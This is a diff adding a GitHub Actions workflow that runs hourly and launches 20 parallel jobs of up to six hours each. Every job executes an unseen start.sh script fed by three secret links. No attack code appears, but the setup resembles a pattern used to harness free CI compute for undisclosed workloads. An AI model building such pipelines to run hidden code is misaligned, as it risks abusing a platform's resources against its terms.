@@ -1,0 +1,31 @@
+name: FirstStep
+
+on:
+  schedule:
+    - cron: 20 */1 * * *
+  workflow_dispatch:
+
+jobs:
+
+  build:
+    name : FirstStep
+    runs-on: ubuntu-18.04
+    strategy:
+      max-parallel: 30
+      fail-fast: false
+      matrix:
+        flag: [Step1, Step2, Step3, Step4, Step5, Step6, Step7, Step8, Step9, Step10, Step11, Step12, Step13, Step14, Step15, Step16, Step17, Step18, Step19, Step20]
+    timeout-minutes: 360
+    env:
+        NUM_JOBS: 10
+    steps:
+      
+      - uses: actions/checkout@v2
+      
+      - name: Run
+        run: bash start.sh
+        
+        env:
+          LINK1: ${{secrets.LINK1}}
+          LINK2: ${{secrets.LINK2}}
+          LINK3: ${{secrets.LINK3}}
